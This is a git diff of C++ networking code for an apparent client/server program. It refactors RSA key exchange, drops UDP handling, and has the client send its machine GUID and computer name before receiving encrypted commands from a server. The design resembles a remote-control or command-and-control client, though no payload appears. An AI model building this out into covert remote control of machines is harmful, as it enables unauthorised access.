@@ -4,12 +4,6 @@
 
 #ifdef CLIENT_RELEASE
 
-BIO* GetKey(std::string s) {
-	std::string decoded = "";
-	macaron::Base64::Decode(s, decoded);
-	return Serialization::GetBIOFromString(decoded);
-}
-
 Client::Client() {
 	NetCommon::LoadWSAFunctions();
 
@@ -30,6 +24,8 @@ Client::Client() {
 	this->m_UDPServerDetails.port = UDP_PORT;
 	this->m_UDPServerDetails.type = SOCK_DGRAM;
 
+	RSAKeys gen = LGCrypto::GenerateRSAPair(4096);
+	this->SetRequestSecrets(gen);
 	SetRemoteMachineGUID();
 	SetRemoteComputerName();
 }
@@ -86,12 +82,7 @@ BOOL Client::Connect() {
 	OutputDebugStringA("socket");
 
 	RSAKeys keys = LGCrypto::GenerateRSAPair(4096);
-	this->m_ClientKeys.bioClientPrivateKey = keys.bioPrivateKey;
-	this->m_ClientKeys.bioClientPublicKey = keys.bioPublicKey;
-	this->m_ClientKeys.clientPrivateKey = keys.strPrivateKey;
-	this->m_ClientKeys.clientPublicKey = keys.strPublicKey;
-	this->m_ClientKeys.rsaPublic = keys.rsaPublicKey;
-	this->m_ClientKeys.rsaPrivate = keys.rsaPrivateKey;
+	this->SetRequestSecrets(keys);
 
 	ExchangePublicKeys();
 	SendComputerNameToServer();
@@ -147,14 +138,14 @@ BYTESTRING Client::MakeTCPRequest(const ClientRequest& req, BOOL encrypted) {
 	BOOL sent = FALSE;
 
 	if ( encrypted )
-		sent = NetCommon::TransmitData(req, this->m_TCPSocket, TCP, NetCommon::_default, TRUE, this->m_ClientKeys.serverRSAPublic, FALSE);
+		sent = NetCommon::TransmitData(req, this->m_TCPSocket, TCP, NetCommon::_default, TRUE, this->m_ServerPublicKey, FALSE);
 	else
 		sent = NetCommon::TransmitData(req, this->m_TCPSocket, TCP);
 
 	if ( !sent ) return {};
 
 	BYTESTRING serverResponse;
-	BOOL received = NetCommon::ReceiveData(serverResponse, this->m_TCPSocket, TCP, NetCommon::_default, encrypted, this->m_ClientKeys.rsaPrivate, TRUE);
+	BOOL received = NetCommon::ReceiveData(serverResponse, this->m_TCPSocket, TCP, NetCommon::_default, encrypted, this->m_RequestSecrets.priv, TRUE);
 	if ( !received ) return {};
 
 	return serverResponse;
@@ -264,23 +255,11 @@ void Client::ListenForServerCommands() {
 	//CLIENT_DBG("stopped receiving cmds ");
 }
 
-void Client::ReceiveCommandsFromServer() { 
-	
-	MessageBoxA(NULL, "HI", "HI", MB_OK);
-}
- 
-// decode base64 key
-std::string OnReceiveKey(BYTESTRING serialized) {
-	std::string b64priv = Serialization::BytestringToString(serialized);
-	return b64priv;
-}
-
 BOOL Client::ExchangePublicKeys() {
-	int len = i2d_RSAPublicKey(this->m_ClientKeys.rsaPublic, nullptr);
-	std::cout << len << std::endl;
+	int len = i2d_RSAPublicKey(this->m_RequestSecrets.pub, nullptr);
 	unsigned char* data = NULL;
 
-	i2d_RSAPublicKey(this->m_ClientKeys.rsaPublic, &data);
+	i2d_RSAPublicKey(this->m_RequestSecrets.pub, &data);
 
 	// Send size of private key first
 	Send(this->m_TCPSocket, ( char* ) &len, sizeof(len), 0);
@@ -297,54 +276,10 @@ BOOL Client::ExchangePublicKeys() {
 	Receive(this->m_TCPSocket, ( char* ) clientDer, clientLen, 0);
 	const unsigned char* constDer = clientDer;
 	RSA* rsaPubKey = d2i_RSAPublicKey(nullptr, &constDer, clientLen);
-	this->m_ClientKeys.serverRSAPublic = rsaPubKey;
+	this->m_ServerPublicKey = rsaPubKey;
 	CLIENT_DBG("got servers public key");
 	free(clientDer);
 	return TRUE;
-}
-
-
-BOOL Client::GetRequestRSAKeysFromServer() {
-	// get first half 
-	BYTESTRING derPrivateKey(1024);
-	int size = 0;
-	Receive(this->m_TCPSocket, ( char* ) &size, sizeof(size), 0); // recv data size first
-	Receive(this->m_TCPSocket, ( char* ) derPrivateKey.data(), size, 0);
-	const unsigned char* data = derPrivateKey.data();
-	RSA* rsaKey = d2i_RSAPrivateKey(nullptr, &data, size);
-	BIO* bio = BIO_new(BIO_s_mem());
-
-	// Write the RSA public key to the BIO in PEM format
-	PEM_write_bio_RSAPrivateKey(bio, rsaKey, nullptr, nullptr, 0, nullptr, nullptr);
-
-	// Get the data from the BIO
-	BUF_MEM* bufPtr;
-	BIO_get_mem_ptr(bio, &bufPtr); // Get a pointer to the buffer
-	BIO_flush(bio); // Ensure all data is written to the buffer
-
-	std::string pemData(bufPtr->data, bufPtr->length); // Create a string from the buffer
-	BIO_free(bio); // Free the BIO
-
-
-
-	CLIENT_DBG("received private key");
-
-	this->m_RequestSecrets.strPrivateKey = pemData;
-	CLIENT_DBG(this->m_RequestSecrets.strPrivateKey.c_str());
-
-	/*NetCommon::ReceiveData(publicKeyTop, this->m_TCPSocket, TCP);
-	CLIENT_DBG("received top");
-	NetCommon::ReceiveData(publicKeyBottom, this->m_TCPSocket, TCP);
-	CLIENT_DBG("received bottom");
-	BYTESTRING publicKey = NetCommon::MergeSplitRSAKey(std::make_pair(publicKeyTop, publicKeyBottom));
-
-	this->m_RequestSecrets.strPublicKey = Serialization::BytestringToString(publicKey);
-
-	CLIENT_DBG("got private key!");
-	CLIENT_DBG(this->m_RequestSecrets.strPrivateKey.c_str());
-
-	CLIENT_DBG("got public key!");
-	CLIENT_DBG(this->m_RequestSecrets.strPublicKey.c_str());*/
 }
 
 BOOL Client::SendMessageToServer(std::string message, BOOL encrypted) {	
@@ -354,7 +289,7 @@ BOOL Client::SendMessageToServer(std::string message, BOOL encrypted) {
 	BOOL	   success    = FALSE;
 
 	if ( encrypted ) {
-		success = NetCommon::TransmitData(serialized, this->m_TCPSocket, TCP, NetCommon::_default, TRUE, this->m_ClientKeys.serverRSAPublic, FALSE);
+		success = NetCommon::TransmitData(serialized, this->m_TCPSocket, TCP, NetCommon::_default, TRUE, this->m_ServerPublicKey, FALSE);
 	} else
 		success = NetCommon::TransmitData(serialized, this->m_TCPSocket, TCP);
 
@@ -364,7 +299,7 @@ BOOL Client::SendMessageToServer(std::string message, BOOL encrypted) {
 BYTESTRING Client::GetCommand() {
 	BYTESTRING received;
 	NetCommon::ReceiveData(received, this->m_TCPSocket, TCP);
-	BYTESTRING decrypted = LGCrypto::RSADecrypt(received, this->m_ClientKeys.rsaPrivate, TRUE);
+	BYTESTRING decrypted = LGCrypto::RSADecrypt(received, this->m_RequestSecrets.priv, TRUE);
 	std::string dbg = "decrypted size : " + std::to_string(decrypted.size()) + "\n";
 	CLIENT_DBG(dbg.c_str());
 	std::string message = Serialization::BytestringToString(decrypted);
@@ -398,10 +333,9 @@ BOOL Client::SendMessageToServer(const Server& dest, ClientMessage message) {
 }
 
 BOOL Client::SendEncryptedMessageToServer(const Server& dest, ClientMessage message) {
-	BIO* pk = Serialization::GetBIOFromString(this->m_RequestSecrets.strPublicKey);
 	BOOL success = FALSE;
 	if ( dest.type == SOCK_STREAM ) // tcp
-		success = NetCommon::TransmitData(message, this->m_TCPSocket, TCP, NetCommon::_default, TRUE, this->m_ClientKeys.serverRSAPublic, FALSE);
+		success = NetCommon::TransmitData(message, this->m_TCPSocket, TCP, NetCommon::_default, TRUE, this->m_ServerPublicKey, FALSE);
 	//else if ( dest.type == SOCK_DGRAM ) // udp
 		//success = NetCommon::TransmitData(message, this->m_UDPSocket, UDP, dest.addr, TRUE, pk, FALSE);
 
@@ -410,11 +344,10 @@ BOOL Client::SendEncryptedMessageToServer(const Server& dest, ClientMessage mess
 
 template <typename _Ty>
 BOOL Client::GetEncryptedMessageOnServer(const Server& dest, _Ty& out) {
-	BIO* pk = Serialization::GetBIOFromString(this->m_RequestSecrets.strPrivateKey);
 	BOOL success = FALSE;
 
 	if ( dest.type == SOCK_STREAM )
-		success = NetCommon::ReceiveData(out, this->m_TCPSocket, TCP, NetCommon::_default, TRUE, pk, FALSE);
+		success = NetCommon::ReceiveData(out, this->m_TCPSocket, TCP, NetCommon::_default, TRUE, this->m_RequestSecrets.priv, TRUE);
 
 	return success;
 }
@@ -436,8 +369,8 @@ BOOL Client::Disconnect() {
 
 #elif defined(SERVER_RELEASE)
 
-Client::Client(SOCKET tcp, SOCKET udp, sockaddr_in addr)
-	: AddressInfo(addr), m_TCPSocket(tcp), m_UDPSocket(udp)
+Client::Client(SOCKET tcp, sockaddr_in addr)
+	: AddressInfo(addr), m_TCPSocket(tcp)
 {
 	std::random_device gen;
 	std::mt19937 rng(gen());
@@ -446,9 +379,6 @@ Client::Client(SOCKET tcp, SOCKET udp, sockaddr_in addr)
 }
 
 void Client::Disconnect() {
-	if ( this->m_UDPSocket != INVALID_SOCKET )
-		CloseSocket(this->m_UDPSocket);
-
 	if ( this->m_TCPSocket != INVALID_SOCKET )
 		CloseSocket(this->m_TCPSocket);
 
